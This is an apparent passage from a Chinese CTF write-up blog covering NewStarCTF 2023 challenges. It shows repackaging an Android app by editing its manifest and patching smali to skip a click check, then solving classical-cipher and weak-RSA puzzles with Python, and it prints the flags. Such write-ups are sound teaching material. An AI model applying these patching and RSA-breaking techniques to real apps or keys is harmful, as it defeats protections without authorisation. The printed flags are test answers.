class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">platformBuildVersionName</span>=<span class="hljs-string">&quot;12&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span> <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:appComponentFactory</span>=<span class="hljs-string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="hljs-attr">android:dataExtractionRules</span>=<span class="hljs-string">&quot;@xml/data_extraction_rules&quot;</span> <span class="hljs-attr">android:fullBackupContent</span>=<span class="hljs-string">&quot;@xml/backup_rules&quot;</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>将入口处改为FlagActivity，并且把FlagActivity的exported改为true</p>
<p>改后xml文件如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> standalone=<span class="hljs-string">&quot;no&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="hljs-attr">android:compileSdkVersion</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">android:compileSdkVersionCodename</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="hljs-attr">platformBuildVersionCode</span>=<span class="hljs-string">&quot;32&quot;</span> <span class="hljs-attr">platformBuildVersionName</span>=<span class="hljs-string">&quot;12&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span> <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:appComponentFactory</span>=<span class="hljs-string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="hljs-attr">android:dataExtractionRules</span>=<span class="hljs-string">&quot;@xml/data_extraction_rules&quot;</span> <span class="hljs-attr">android:fullBackupContent</span>=<span class="hljs-string">&quot;@xml/backup_rules&quot;</span> <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span> <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>重新编译后打开，发现要求点击按钮10000次才能获得flag。</p>
<p>分析smali语句</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java">.<span class="hljs-keyword">class</span> <span class="hljs-title class_">Lcom</span>/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;<br>.<span class="hljs-built_in">super</span> Ljava/lang/Object;<br>.source <span class="hljs-string">&quot;FlagActivity.java&quot;</span><br><br># interfaces<br>.<span class="hljs-keyword">implements</span> <span class="hljs-title class_">Landroid</span>/view/View$OnClickListener;<br><br><br># annotations<br>.annotation system Ldalvik/annotation/EnclosingMethod;<br>    value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V<br>.end annotation<br><br>.annotation system Ldalvik/annotation/InnerClass;<br>    accessFlags = <span class="hljs-number">0x0</span><br>    name = <span class="hljs-literal">null</span><br>.end annotation<br><br><br># instance fields<br>.field <span class="hljs-keyword">final</span> synthetic <span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>.field <span class="hljs-keyword">final</span> synthetic val$str:Landroid/widget/EditText;<br><br>.field <span class="hljs-keyword">final</span> synthetic val$tv_cnt:Landroid/widget/TextView;<br><br><br># direct methods<br>.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V<br>    .locals <span class="hljs-number">0</span><br><br>    .line <span class="hljs-number">20</span><br>    iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;<br><br>    iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$str:Landroid/widget/EditText;<br><br>    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V<br><br>    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span><br>.end method<br><br><br># virtual methods<br>.method <span class="hljs-keyword">public</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(Landroid/view/View;)</span>V<br>    .locals <span class="hljs-number">2</span><br><br>    .line <span class="hljs-number">23</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;<br><br>    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="hljs-number">004</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I<br><br>    move-result v0<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;<br><br>    move-result-object v0<br><br>    invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V<br><br>    .line <span class="hljs-number">24</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    invoke-<span class="hljs-keyword">static</span> &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="hljs-number">000</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I<br><br>    move-result p1<br><br>    const/<span class="hljs-number">16</span> v0, <span class="hljs-number">0x2710</span><br><br>    <span class="hljs-keyword">if</span>-lt p1, v0, :cond_0<br><br>    .line <span class="hljs-number">25</span><br>    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;<span class="hljs-built_in">this</span>$<span class="hljs-number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;<br><br>    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="hljs-number">1</span>;-&gt;val$str:Landroid/widget/EditText;<br><br>    invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;<br><br>    move-result-object v0<br><br>    invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;<br><br>    move-result-object v0<br><br>    const/<span class="hljs-number">4</span> v1, <span class="hljs-number">0x0</span><br><br>    invoke-<span class="hljs-keyword">static</span> &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;<br><br>    move-result-object p1<br><br>    invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V<br><br>    :cond_0<br>    <span class="hljs-keyword">return</span>-<span class="hljs-keyword">void</span><br>.end method<br><br></code></pre></td></tr></table></figure>

<p>发现其中的<code>const/16 v0, 0x2710</code>，其存储为点击次数，将其改为0x1，重新编译安装，打开后点击按钮直接得到flag</p>
<img src="/2023/09/26/2023newstarctfWeek1/apkre.png" srcset="/img/loading.gif" lazyload class="">

<p><code>flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>解题 10&#x2F;10</p>
<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>下载附件，得到</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">++++++++</span><span class="hljs-title">[</span>&gt;&gt;<span class="hljs-literal">++</span>&gt;<span class="hljs-literal">++++</span>&gt;<span class="hljs-literal">++++++</span>&gt;<span class="hljs-literal">++++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&gt;<span class="hljs-literal">++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++</span>&gt;<span class="hljs-literal">++++++++++++++++++++++++++++++</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++++++</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">----</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-string">.</span>&gt;&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&lt;<span class="hljs-string">.</span>&gt;<span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">------</span><span class="hljs-string">.</span>&lt;<span class="hljs-string">.</span>&gt;<span class="hljs-string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">+++++++</span><span class="hljs-string">.</span>&gt;&gt;&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">-------</span><span class="hljs-string">.</span>&gt;&gt;&gt;<span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;&lt;&lt;<span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">+++++++</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">+++</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;<span class="hljs-string">.</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">-------</span><span class="hljs-string">.</span><span class="hljs-literal">+</span><span class="hljs-string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="hljs-literal">++</span><span class="hljs-string">.</span><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a>，解密一下，得到flag：<code>flag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;</code></p>
<h3 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h3><p>打开附件，得到<code>kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;</code></p>
<p>凯撒枚举<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/caesar">凯撒(Caesar)加密&#x2F;解密 - Bugku CTF</a>，得到flag：<code>flag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125;</code></p>
<h3 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h3><p>附件内容：<code>fa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3</code></p>
<p>栅栏加密<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/railfence">栅栏加密&#x2F;解密 - Bugku CTF</a>，枚举解密，得到flag：<code>flag&#123;reordering_the_plaintext#686f8c03&#125;</code></p>
<h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><p>附件：<code>pqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125;</code></p>
<p>维吉尼亚解密<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/vigenere">维吉尼亚加密&#x2F;解密 - Bugku CTF</a>，密钥用flag前4个字母尝试一下得到：KFC</p>
<p>得到flag：<code>flag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125;</code></p>
<h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>打开附件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_prime</span>(<span class="hljs-params">n</span>):<br>    res = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        res *= getPrime(n)<br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = gen_prime(<span class="hljs-number">32</span>)<br>    e = <span class="hljs-number">65537</span><br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m,e,n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><br><span class="hljs-comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br></code></pre></td></tr></table></figure>

<p>使用大整数分解网站<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php?id=1100000004708746782">factordb.com</a>，将其分解为多个质数之积</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1729006607</span>...<span class="hljs-number">61</span>&lt;<span class="hljs-number">143</span>&gt; = <span class="hljs-number">2217990919</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2338725373</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2370292207</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2463878387</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2706073949</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2794985117</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2804303069</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2923072267</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">2970591037</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3207148519</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3654864131</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3831680819</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">3939901243</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">4093178561</span>&lt;<span class="hljs-number">10</span>&gt; · <span class="hljs-number">4278428893</span>&lt;<span class="hljs-number">10</span>&gt;<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><br>n = <span class="hljs-number">2217990919</span> * <span class="hljs-number">2338725373</span> * <span class="hljs-number">2370292207</span> * <span class="hljs-number">2463878387</span> * <span class="hljs-number">2706073949</span> * <span class="hljs-number">2794985117</span> * <span class="hljs-number">2804303069</span> * <span class="hljs-number">2923072267</span> * <span class="hljs-number">2970591037</span> * <span class="hljs-number">3207148519</span> * <span class="hljs-number">3654864131</span> * <span class="hljs-number">3831680819</span> * <span class="hljs-number">3939901243</span> * <span class="hljs-number">4093178561</span> * <span class="hljs-number">4278428893</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br><br><span class="hljs-comment"># 尝试分解 n</span><br>factors = [<span class="hljs-number">2217990919</span>, <span class="hljs-number">2338725373</span>, <span class="hljs-number">2370292207</span>, <span class="hljs-number">2463878387</span>, <span class="hljs-number">2706073949</span>, <span class="hljs-number">2794985117</span>, <span class="hljs-number">2804303069</span>, <span class="hljs-number">2923072267</span>, <span class="hljs-number">2970591037</span>, <span class="hljs-number">3207148519</span>, <span class="hljs-number">3654864131</span>, <span class="hljs-number">3831680819</span>, <span class="hljs-number">3939901243</span>, <span class="hljs-number">4093178561</span>, <span class="hljs-number">4278428893</span>]<br><br><span class="hljs-comment"># 计算 phi(n)</span><br>phi_n = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> factor <span class="hljs-keyword">in</span> factors:<br>    phi_n *= (factor - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = inverse(e, phi_n)<br><br><span class="hljs-comment"># 解密密文得到明文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将明文转换为字节形式</span><br>flag = m.to_bytes((m.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>



<h3 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h3><p>打开附件py代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br><br>d = getPrime(<span class="hljs-number">32</span>)<br>e = inverse(d, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>n = p*q<br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(e)<br><span class="hljs-built_in">print</span>(n)<br><br><span class="hljs-comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="hljs-comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="hljs-comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br></code></pre></td></tr></table></figure>

<p>看到d数值比较小，使用低解密指数攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 